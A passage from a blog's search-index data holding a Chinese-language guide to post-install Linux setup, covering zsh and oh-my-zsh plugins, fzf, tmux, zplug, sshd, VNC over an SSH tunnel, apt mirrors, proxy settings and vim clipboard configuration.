.zshrc</code>   - \u76f4\u63a5\u590d\u5236\u5373\u53ef\uff0c\u4e0d\u7528\u4fee\u6539\u5185\u5bb9 - chsh   - openwrt\u6ca1\u6709chsh\u547d\u4ee4\uff0c\u9700\u8981\u4fee\u6539/etc/passwd   - \u6ce8\u610f\uff0c\u5982\u679c\u4fee\u6539\u9519\u8bef\uff08\u5982\u76f4\u63a5\u8f93\u5165zsh\u800c\u4e0d\u662fzsh\u4ece\u6839\u5f00\u59cb\u7684\u5b8c\u6574\u8def\u5f84\uff09\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55openwrt</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5b89\u88c5oh-my-zsh\u5e76\u5b89\u88c5\u63d2\u4ef6","title":"\u5b89\u88c5oh-my-zsh\u5e76\u5b89\u88c5\u63d2\u4ef6","text":"<p>install\uff1aOh My Zsh - a delightful &amp; open source framework for Zsh</p> <pre><code> sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n</code></pre> <p>tips:</p> <ol> <li>\u5b89\u88c5oh-my-zsh\u4f1a\u4f7f\u7528git\u514b\u9686\u4ed3\u5e93\uff0c\u8bf7\u63d0\u524d\u5b89\u88c5git\u5e76\u8bbe\u7f6e\u4ee3\u7406</li> <li>\u5982\u679c\u8fde\u63a5\u4e0d\u4e0araw.github.com\u53ef\u4ee5\u5c1d\u8bd5\u66f4\u6362DNS\u3002\u66f4\u4fdd\u9669\u7684\u8fd8\u662f\u7ed9bash\u8bbe\u7f6e\u4ee3\u7406</li> <li>\u63a8\u8350\u76f4\u63a5\u4ece\u53e6\u4e00\u53f0\u673a\u5668\u4e0ascp</li> </ol>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh-autosuggestions","title":"zsh-autosuggestions","text":"<p>zsh-autosuggestions \u4f5c\u7528\uff1a\u81ea\u52a8\u63d0\u793a\u547d\u4ee4</p> <pre><code>git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions\n</code></pre> <p>\u5728.zshrc\u4e2dplugin\u884c\u6dfb\u52a0zsh-autosuggestions\uff0c\u5373</p> <pre><code>plugins=(git zsh-autosuggestions)\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh-syntax-highlighting","title":"zsh-syntax-highlighting","text":"<p>zsh-syntax-highlighting \u4f5c\u7528\uff1a\u547d\u4ee4\u9ad8\u4eae\uff0c\u6b63\u786e\u7684\u547d\u4ee4\u663e\u793a\u7eff\u8272\uff0c\u9519\u8bef\u7684\u663e\u793a\u4e3a\u7ea2\u8272</p> <pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting\necho \"source $ZSH_CUSTOM/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\" &gt;&gt; ${ZDOTDIR:-$HOME}/.zshrc\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#autojump","title":"autojump","text":"<p>autojump \u4f5c\u7528\uff1aj\u76f4\u63a5\u8df3\u8f6c\u5230\u4efb\u610f\u4e00\u4e2a\u76ee\u5f55</p> <pre><code>git clone git://github.com/wting/autojump.git $ZSH_CUSTOM/plugins/autojump\n\ncd $ZSH_CUSTOM/plugins/autojump\n./install.py or ./uninstall.py  #\u5982\u679c\u7cfb\u7edf\u53ea\u8bc6\u522bpython3\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u8f6f\u94fe\u63a5python\u6307\u5411python3\u3002\u6216\u8005python3 install.py\n\n#\u5c06install.py\u7ed3\u5c3e\u8f93\u51fa\u590d\u5236\u5230.zshrc\u4e2d\n</code></pre> <p>\u6309\u7167install.py\u8f93\u51fa\u63d0\u793a\uff0c\u590d\u5236\u5bf9\u5e94\u4ee3\u7801\u5230zshrc\u4e2d</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#fzf","title":"fzf","text":"<p>fzf is a general-purpose command-line fuzzy finder.</p> <p>\u4f7f\u7528fzf\u914d\u5408ctrl-r\uff0c\u53ef\u4ee5\u6781\u5927\u65b9\u4fbf\u67e5\u627e\u8f93\u5165\u8fc7\u53bb\u6307\u4ee4\u3002</p> <p>\u63a8\u8350\u4f7f\u7528git\u65b9\u5f0f\uff0c\u4f7f\u7528\u8f6f\u4ef6\u5305\u5b89\u88c5\u7684\u65b9\u5f0f\u6ca1\u6709\u8bbe\u7f6e\u5feb\u6377\u952e\uff08\u5728bash, zsh\u4e0a\u5747\u662f\u5982\u6b64\uff09\uff0c\u5982ctrl-r\u641c\u7d22\u65f6\u8c03\u7528fzf</p> <pre><code>git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install\n</code></pre> <p>\u5f53\u7136\uff0cfzf\u7684\u529f\u80fd\u8fdc\u4e0d\u6b62\u641c\u7d22\u5386\u53f2\u8bb0\u5f55\uff0c\u66f4\u591a\u7528\u6cd5\u53ef\u4ee5\u67e5\u770b\u89c6\u9891\uff1aVim universe. fzf - command line fuzzy finder - YouTube</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u95ee\u9898","title":"\u95ee\u9898","text":"<p>\u5982\u679cctrl-r\u663e\u793a<code>unknown option: --scheme=history</code>\uff0c\u662f\u56e0\u4e3a\u7cfb\u7edfapt\u5b89\u88c5\u7684fzf\u7248\u672c\u8fc7\u65e7\u5bfc\u81f4\u7684\u3002</p> <p>\u4f7f\u7528git\u5b89\u88c5\u65f6\uff0c<code>~/.fzf/install</code>\u4f1a\u4e0b\u8f7dfzf bin\u6587\u4ef6\uff0c\u4e4b\u540e\u5c06git\u4ed3\u5e93\u4e0b<code>.fzf/bin</code>\u6dfb\u52a0\u5230PATH\u53d8\u91cf\u5c3e\u90e8\u3002\u4f46\u662f\u7531\u4e8e\u662f\u5728PATH\u5c3e\u90e8\uff0c\u56e0\u6b64\u4f18\u5148\u7ea7\u4e0d\u5982\u7cfb\u7edf\u7684/usr/bin\u76ee\u5f55\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u624b\u52a8\u4fee\u6539<code>.fzf.bash</code>\u6587\u4ef6</p> <pre><code># Setup fzf\n# ---------\n#if [[ ! \"$PATH\" == */staff/fyyuan/.fzf/bin* ]]; then\n#  #PATH=\"${PATH:+${PATH}:}/staff/fyyuan/.fzf/bin\"\n#  PATH=\"/staff/fyyuan/.fzf/bin:$PATH\"\n#fi\nPATH=\"/staff/fyyuan/.fzf/bin:$PATH\"\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#tmuxtmuxoh-my-tmux","title":"tmux(.tmux(oh-my-tmux))","text":"<pre><code>git clone https://github.com/gpakosz/.tmux\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n\ntmux source-file .tmux.conf\n</code></pre> <p>\u6bd4\u8f83\u597d\u7528\u7684\u51e0\u4e2a\u529f\u80fd</p> <p>session</p> <ul> <li><code>&lt;prefix&gt; f enter</code>\uff1a\u663e\u793a\u6240\u6709\u7684\u4f1a\u8bdd\u3001\u7a97\u53e3\uff0c\u5e76\u63d0\u4f9b\u9884\u89c8\u3002\u65b9\u4fbf\u7ba1\u7406\u591a\u4e2a\u4f1a\u8bdd</li> <li><code>&lt;prefix&gt; shift-Tab(BTab)</code>\uff1a\u5207\u6362\u5230\u4e0a\u4e00\u4e2asession</li> <li> <p><code>&lt;prefix&gt; ctrl-c</code>\uff1a\u521b\u5efa\u65b0session</p> </li> <li> <p><code>&lt;prefix&gt; hjkl</code>\uff1a\u5728\u4e0d\u540cpanel\u4e2d\u5207\u6362\uff0c\u66f4\u7b26\u5408vim\u4e60\u60ef</p> </li> <li><code>&lt;prefix&gt; b, P</code>\uff1ab\u663e\u793a\u526a\u5207\u677f\uff08buffer\uff09\uff0cP\u9009\u62e9\u7c98\u8d34</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4fee\u6539","title":"\u4fee\u6539","text":"<p>\u7531\u4e8etmux\u9ed8\u8ba4\u7684prefix\u662f<code>Ctrl-b</code>\u4e0d\u592a\u597d\u6309\uff0c\u56e0\u6b64\u6211\u4f1a\u628a\u5b83\u6362\u6210<code>ctrl-x</code></p> <p>\u7a97\u53e3\u5207\u6362\u6539\u4e3a\u4e86<code>tab, C-h, C-l</code>\uff0c\u611f\u89c9\u6709\u70b9\u9ebb\u70e6\uff0c\u56e0\u6b64\u5c06<code>p</code>\u7c98\u8d34\u4e0a\u4e00\u4e2abuffer\u529f\u80fd\u53bb\u6389\uff0c\u6362\u56de\u539f\u672c\u7684<code>n, p</code></p> <pre><code>set -g prefix2 C-x\nbind C-x send-prefix -2\n\nbind -r n previous-window # select previous window\nbind -r p next-window     # select next window\nbind Tab last-window      # move to last active window\n\n#bind p paste-buffer  # paste from the top paste buffer\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zplug","title":"zplug","text":"<p>zplug/zplug: A next-generation plugin manager for zsh (github.com) zsh\u7684\u4e00\u4e2a\u63d2\u4ef6\u7ba1\u7406\u5de5\u5177\uff0c\u7c7b\u4f3c\u7684\u8fd8\u6709<code>Antigen</code>\uff0c\u4f18\u70b9\u662f\u542f\u52a8\u66f4\u52a0\u5feb\u901f\u3002 \u76f8\u6bd4\u4e8eoh-my-zsh\u7684\u63d2\u4ef6\u7ba1\u7406\uff0c\u5b89\u88c5\u914d\u7f6e\u90fd\u66f4\u7b80\u5355\uff08\u5982\u4e0d\u9700\u8981\u624b\u52a8git clone\u5b89\u88c5\u63d2\u4ef6\uff0c\u6709\u7684\u63d2\u4ef6\u8fd8\u9700\u8981\u4fee\u6539.zshrc\u7b49\uff09</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>\u5b89\u88c5 <pre><code>curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh\n</code></pre></p> <p>\u914d\u7f6e\uff1a\u5728<code>.zshrc</code>\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u8282\uff0c\u5176\u4e2d<code>zplug 'endaaman/lxd-completion-zsh'</code>\u6307\u5b9a\u4e86\u9700\u8981\u4f7f\u7528\u7684\u63d2\u4ef6\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u63d2\u4ef6 - \u5b89\u88c5\u63d2\u4ef6\u9700\u8981\u8bbe\u7f6e\u4ee3\u7406 <pre><code>##########\n#####  zplug\n##########\nsource ~/.zplug/init.zsh\n\n# Zsh completion for lxc and lxd commands of LXD.\nzplug 'endaaman/lxd-completion-zsh'\n\n# Fish-like fast/unobtrusive autosuggestions for zsh.\nzplug 'zsh-users/zsh-autosuggestions'\n\n# Fish shell-like syntax highlighting for Zsh.\nzplug 'zsh-users/zsh-syntax-highlighting'\n\n# Install plugins if there are plugins that have not been installed\nif ! zplug check --verbose; then\n    printf \"Install? [y/N]: \"\n    if read -q; then\n        echo; zplug install\n    fi\nfi\n\n# Then, source plugins and add commands to $PATH\nzplug load\n</code></pre></p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5bfb\u627e\u63d2\u4ef6","title":"\u5bfb\u627e\u63d2\u4ef6","text":"<ul> <li>zsh-user: zsh-users (github.com)</li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u81ea\u5b9a\u4e49prompt","title":"\u81ea\u5b9a\u4e49prompt","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bash","title":"bash","text":"<p>Bash/Prompt customization - ArchWiki (archlinux.org) bash(1) \u2014 Arch manual pages (archlinux.org)</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#zsh_1","title":"zsh","text":"<p>Zsh - ArchWiki (archlinux.org)</p> <p>\u521d\u59cb\u5316\u81ea\u5e26\u7684prompt theme system <pre><code>~/.zshrc\nautoload -Uz promptinit\npromptinit\n</code></pre></p> <pre><code>prompt -l   # \u5217\u51fa\u6240\u6709\nprompt -p   # \u9884\u89c8\u6240\u6709\nprompt walters  # \u9009\u62e9\u4e00\u4e2atheme\n</code></pre> <p>\u81ea\u5b9a\u4e49theme <pre><code># Load promptinit\nautoload -Uz promptinit &amp;&amp; promptinit\n\n# Define the theme\nprompt_mytheme_setup() {\n  PS1=\"%~%# \"\n}\n\n# Add the theme to promptsys\nprompt_themes+=( mytheme )\n\n# Load the theme\nprompt mytheme\n</code></pre></p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#customized","title":"Customized","text":"<ul> <li>\u517c\u5bb9bash\u7684left-sided prompt: PS1, PS2, ...\uff0c\u81ea\u5df1\u6709\u522b\u540d\uff1aPROMPT, PROMPT2...</li> <li>\u53e6\u5916\u652f\u6301\u00a0right-sided prompt\uff1a<code>RPS1</code>\u00a0(<code>RPROMPT</code>)</li> </ul> <pre><code>print -P '%B%F{red}co%F{green}lo%F{blue}rs%f%b'   # \u6d4b\u8bd5\u6548\u679c\n\nPROMPT='%n@%m\u00a0%~\u00a0%# '\n\nprint -P \"%l %M %m %n %y %d\"\n%~\n</code></pre> <p>zshmisc(1) \u2014 Arch manual pages (archlinux.org)</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u7f8e\u5316","title":"\u7f8e\u5316","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#ubuntu","title":"Ubuntu","text":"<ul> <li>dock\u680f</li> </ul> <p>\u5728\u8bbe\u7f6e-&gt;\u5916\u89c2\u4e2d\u8bbe\u7f6edock\u680f\u4e3a\u5e95\u90e8\u3001\u81ea\u52a8\u9690\u85cf\uff0c\u5e76\u8bbe\u7f6e\u5408\u9002\u7684\u5927\u5c0f\u3002</p> <ul> <li>\u80cc\u666f\u56fe</li> </ul> <p>\u6682\u65f6\u8fd8\u6ca1\u6709\u627e\u5230\u6bd4\u8f83\u597d\u7684\u8f6e\u64ad\u56fe\u7247\u7684\u65b9\u6cd5</p> <ul> <li>gnome-terminal</li> </ul> <p>\u8bbe\u7f6e\u80cc\u666f\u989c\u8272\u548c\u900f\u660e\u5ea6</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u670d\u52a1","title":"\u670d\u52a1","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#sshd","title":"sshd","text":"<p>\u53c2\u8003\uff1aService - OpenSSH | Ubuntu</p> <p>\u5b89\u88c5openssh-server\uff08\u6709\u53ef\u80fd\u9ed8\u8ba4\u5b89\u88c5\u4e86\uff09</p> <pre><code>sudo apt install openssh-server\n</code></pre> <p>\u914d\u7f6esshd\uff0c\u5982\u7aef\u53e3</p> <pre><code>sudo vim /etc/ssh/sshd_config\n</code></pre> <p>\u8fd0\u884csshd</p> <ul> <li>ubuntu</li> </ul> <pre><code>sudo systemctl restart sshd.service\n</code></pre> <ul> <li>deepin\u6ca1\u6709systemd sshd.service\uff0c\u4f7f\u7528</li> </ul> <pre><code>sudo service ssh start\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vnc","title":"vnc","text":"<p>\u5e38\u7528\u7684\u6709tigervnc\uff0c\u4f46\u662f\u5b9e\u9645\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7ecf\u5e38\u9047\u5230\u95ee\u9898\uff0c\u6bd4\u5982\u9ed1\u5c4f\u3001\u4efb\u52a1\u680f\u6d88\u5931\u3001xstartup\u8bbe\u7f6e\u3001\u65e0\u6cd5\u4f7f\u7528systemd\u7b49\u95ee\u9898\u3002\u9047\u5230\u95ee\u9898\u4e0d\u8981\u614c\uff0c\u53ef\u80fd\u5c31\u662fvnc\u672c\u8eab\u592a\u70c2\u4e86\uff0c\u80fd\u4e0d\u914d\u5c31\u4e0d\u914d\u3002</p> <p>\u95ee\u9898</p> <ul> <li>\u65b0\u7248\u7684Tigervnc\uff08&gt;=1.10.0\uff09\u4e0d\u518d\u652f\u6301vncserver\u547d\u4ee4\u542f\u52a8\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u3002\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u901a\u8fc7systemed\u4f5c\u4e3a\u7cfb\u7edf\u670d\u52a1\u7684\u65b9\u5f0f\u6765\u542f\u52a8\u3002</li> </ul> <p>\u53c2\u8003\uff1a</p> <ul> <li>VNC\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 - SYAO</li> </ul> <p>tigervnc&lt;1.10</p> <p>tigervnc github\u4ed3\u5e93TigerVNC/tigervnc readme\u8bf4\u7684\u4e0d\u662f\u5f88\u8be6\u7ec6\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5</p> <pre><code>sudo apt install tigervnc-standalone-server\n</code></pre> <p>\u76f4\u63a5vncserver\u542f\u52a8\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884c\u4f1a\u8bbe\u7f6e\u5bc6\u7801</p> <pre><code>vncserver -localhost no #\u8bbe\u7f6e\u4e3ano localhost\uff0c\u4e0d\u7136\u53ea\u80fd\u5728\u672c\u8ba1\u7b97\u673a\u4e0a\u8bbf\u95ee\uff08LAN\u5185\u7684\u90fd\u4e0d\u884c\uff09\u3002\n</code></pre> <p>\u67e5\u770bvncserver\uff0c\u9ed8\u8ba4\u4e3a:</p> <pre><code>  vncserver -list       #\u67e5\u770b\u5f53\u524d\u8fd0\u884c\u7684server\n  vncserver -kill :number #\u505c\u6b62\u6307\u5b9a\u7684server\n</code></pre> <p>\u867d\u7136\u6709\u7684\u6559\u7a0b\u8bf4\u8981\u914d\u7f6exstartup\uff0c\u4f46\u662f\u53ef\u80fd\u4e0d\u914d\u7f6e\u5df2\u7ecf\u53ef\u4ee5\u4e86</p> <ul> <li>deepin\u4e2d\u9700\u8981\u914d\u7f6e\uff0c\u5426\u5219\u4f1a\u9ed1\u5c4f\u3002\u4f46\u662f\u914d\u7f6e\u5b8c\u540e\uff0c\u4ecd\u7136\u9047\u5230\u4e86\u4efb\u52a1\u680f\u6d88\u5931\uff0c\u6d4f\u89c8\u5668\u6253\u5f005-6\u79d2\u7684\u95ee\u9898\u3002<ul> <li>TigerVNC xstartup file for Deepin Linux V20 and Unitech OS Linux V20 (UOS) (github.com)</li> </ul> </li> </ul> <p>\u5ba2\u6237\u7aef\u8fde\u63a5</p> <ul> <li>\u4f7f\u7528realVNC\u8f93\u5165ip_address:port</li> </ul> <p>\u4f7f\u7528\u96a7\u9053\u5efa\u7acb\u52a0\u5bc6\u8fde\u63a5</p> <pre><code>ssh -L 59000:localhost:5901 -C -N -l server_user_name server_ip_address\n</code></pre> <ul> <li>-L 59000:localhost:5901</li> </ul> <p>The -L argument specifies the post on your local computer (ours is 59000) to the given host (localhost) and port (5901) on the destination server (server_ip_address).</p> <ul> <li> <p>-C: This argument speeds up processes and minimizes resource usage.</p> </li> <li> <p>-N: This argument prevents execution of remote commands and tells SSH to only forward ports.</p> </li> <li> <p>-l server_user_name server_ip_address: This line specifies the user you will use to login to the server. </p> </li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u5e38\u7528\u64cd\u4f5c\u53c2\u8003","title":"\u5e38\u7528\u64cd\u4f5c\u53c2\u8003","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt\u76f8\u5173","title":"apt\u76f8\u5173","text":"","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt\u6362\u6e90","title":"apt\u6362\u6e90","text":"<pre><code>cp /etc/apt/sources.list /etc/apt/sources.list.back #\u5907\u4efd\nsed -i \"s/archive.ubuntu.com/mirrors.ustc.edu.cn/g\" /etc/apt/sources.list\nsed -i \"s/security.ubuntu.com/mirrors.ustc.edu.cn/g\" /etc/apt/sources.list\n</code></pre> <p>\u5728vim\u4e2d\u624b\u52a8\u66ff\u6362\u5219\u662f%s</p> <pre><code>:%s/security.ubuntu.com/mirrors.ustc.edu.cn/g\n</code></pre> <p>aliyun mirror ubuntu</p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#apt-get\u4e34\u65f6\u4f7f\u7528sock\u4ee3\u7406","title":"apt-get\u4e34\u65f6\u4f7f\u7528sock\u4ee3\u7406","text":"<pre><code>sudo apt-get -o Acquire::http::proxy=\"socks5://127.0.0.1:1089/\" install typora\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#bash\u8bbe\u7f6e\u4ee3\u7406","title":"bash\u8bbe\u7f6e\u4ee3\u7406","text":"<pre><code>#\u7aef\u53e3\u5bf9\u5e94qv2ray\u8f6f\u4ef6\u9ed8\u8ba4\u8bbe\u7f6e\nexport HTTP_PROXY=http://localhost:8889\nexport HTTPS_PROXY=http://localhost:8889\n</code></pre> <pre><code>unset HTTP_PROXY\nunset HTTPS_PROXY\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#git\u8bbe\u7f6e\u4ee3\u7406","title":"git\u8bbe\u7f6e\u4ee3\u7406","text":"<pre><code>git config --global http.proxy http://127.0.0.1:1080\ngit config --global https.proxy https://127.0.0.1:1080\n</code></pre> <p>git doc: http.proxy</p> <p>\u547d\u4ee4\u884c\u4e34\u65f6\u4ee3\u7406 <pre><code>GIT_TRACE=1 git -c \"http.proxy=address:port\" clone https://...\n</code></pre></p>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u6062\u590d\u9ed8\u8ba4bashrc","title":"\u6062\u590d\u9ed8\u8ba4.bashrc","text":"<ul> <li>\u5728ubuntu\u4e2d\uff0c\u9ed8\u8ba4\u7684bashrc\u6587\u4ef6\u5b58\u50a8\u5728 <code>/etc/skel/.bashrc</code></li> </ul>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#vim\u590d\u5236\u7c98\u8d34\u7cfb\u7edf\u526a\u8d34\u677f","title":"vim\u590d\u5236\u7c98\u8d34\uff08\u7cfb\u7edf\u526a\u8d34\u677f\uff09","text":"<ol> <li>\u9996\u5148\u786e\u8ba4vim\u662f\u5426\u5f00\u542f\u4e86clipboard\u529f\u80fd</li> </ol> <pre><code>vim --version |grep clipboard #\u5982\u679c\u663e\u793a\u51fa-clipboard\u5219\u9700\u8981\u91cd\u88c5vim\n</code></pre> <p>\u5982\u679c\u6ca1\u6709\u5219\u91cd\u88c5</p> <pre><code>sudo apt remove vim\nsudo apt install vim-gtk\n</code></pre> <ol> <li>\u4f7f\u7528\u9f20\u6807\u9009\u4e2d\u5185\u5bb9\uff0c\u8f93\u5165<code>\"+y</code>\u547d\u4ee4\u4fbf\u53ef\u5c06\u5185\u5bb9\u590d\u5236\u5230\u526a\u8d34\u677f\u3002</li> </ol> <p>\u4f7f\u7528<code>\"+p</code>\u5c06\u526a\u8d34\u677f\u5185\u5bb9\u5230\u5f53\u524d\u4f4d\u7f6e\u3002</p> <p>\u6216\u8005</p> <pre><code>\u7136\u540e\u5728.vim/vimrc\u4e2d\u8bbe\u7f6e\u5feb\u6377\u952ectrl-c, ctrl-v\u3002\n\n```\n\"clipboard\nmap &lt;C-c&gt; \"+y&lt;CR&gt;\nmap &lt;C-v&gt; \"+p&lt;CR&gt;\n```\n\n\u6b64\u65f6\u4fbf\u53ef\u4ee5\u5728\u9009\u4e2d\u5185\u5bb9\u65f6\u6309ctrl-c\u590d\u5236\u5230\u7cfb\u7edf\u526a\u5207\u677f\u3002\u5904\u4e8enormal\u6a21\u5f0f\u65f6ctrl-v\u7c98\u8d34\u4e86\u3002\n</code></pre>","tags":["linux","zsh","tmux","fzf","vnc"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-12-%E5%AE%89%E8%A3%85linux%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/#\u89e3\u91ca","title":"\u89e3\u91ca","text":"<p>vim\u4e2d\u5305\u542b\u8bb8\u591a\u4e0d\u540c\u529f\u80fd\u7684\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u5b58\u50a8\u5728vim\u4e2d\u590d\u5236\u7684\u5185\u5bb9\u3002\u53ef\u4ee5\u901a\u8fc7:reg\u547d\u4ee4\u67e5\u770bvim\u4e2d\u5404\u5bc4\u5b58\u5668\u7684\u503c</p> <pre><code>:reg    #\u67e5\u770bvim\u4e2d\u7684\u5bc4\u5b58\u5668\n\n    \"\"      // \u9ed8\u8ba4unnamed\u5bc4\u5b58\u5668\uff0c\u6700\u8fd1\u4e00\u6b21\"d\",\"c\",\"s\",\"x\",\"y\"\u590d\u5236\uff0c\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\n    \"0      // \u6700\u8fd1\u4e00\u6b21\"y\"\u590d\u5236\u5185\u5bb9\n    \"1      // \u6700\u8fd1\u4e00\u6b21\"d\",\"c\",\"s\",\"x\"\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\n    \"2      // \u4e0a\u4e00\u6b21\"d\",\"c\",\"s\",\"x\"\u5220\u9664\uff0c\u4fee\u6539\u5185\u5bb9\uff0c[3-9]\u7c7b\u63a8\n    \"a      // 